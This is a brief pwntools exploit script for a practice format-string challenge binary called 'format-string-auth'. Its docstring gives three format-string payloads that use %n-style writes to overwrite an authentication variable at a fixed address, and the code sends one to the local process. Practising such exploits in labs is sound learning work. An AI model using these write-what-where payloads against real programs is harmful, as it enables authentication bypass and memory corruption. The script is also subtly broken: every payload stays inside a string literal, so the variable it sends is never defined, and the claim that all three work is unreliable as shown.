from pwn import *

context.binary = ELF("./format-string-auth")
"""
I wrote same exploit in different outputs just for practice, all of them work

1.
payload = b"%322376503c%9$naaaaaaa" + p64(0x40404c) # or write context.binary.sym.auth

2.
payload = b"%4919c%8$hn%9$hn" + p64(0x40404c) + p64(0x40404e)

3.
payload = b"%19c%11$hhn%12$hhn%36c%13$hhn%14$hhnaaaa" + p64(0x40404d) + p64(0x40404f) + p64(0x40404c) + p64(0x40404e)
"""

p = process("./format-string-auth")

p.sendafter("phrase?\n", payload)

print(p.recvall().strip().decode(errors = "ignore"))
